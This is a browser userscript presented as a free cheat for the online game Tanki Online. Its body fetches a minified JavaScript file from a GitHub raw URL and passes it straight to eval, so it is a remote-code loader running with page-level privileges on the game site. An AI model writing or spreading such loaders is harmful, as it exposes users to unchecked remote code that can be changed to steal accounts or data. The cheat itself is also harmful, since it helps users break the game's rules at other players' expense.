// ==UserScript==
// @name         Hi_Hi_Cyclone
// @version      1.0.1
// @description  Free game cheat for Tanki Online.
// @author       Cyclone
// @match        https://*.tankionline.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tankionline.com

// @require      https://raw.githubusercontent.com/flyover/imgui-js/master/dist/imgui.umd.js
// @require      https://raw.githubusercontent.com/flyover/imgui-js/master/dist/imgui_impl.umd.js

// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow

// ==/UserScript==

GM_xmlhttpRequest({
    method: 'GET',
    url: 'https://raw.githubusercontent.com/T0HBA/TEST/main/shizoval.min.js',
    nocache: true,
    onload: data => eval(data.responseText)
})
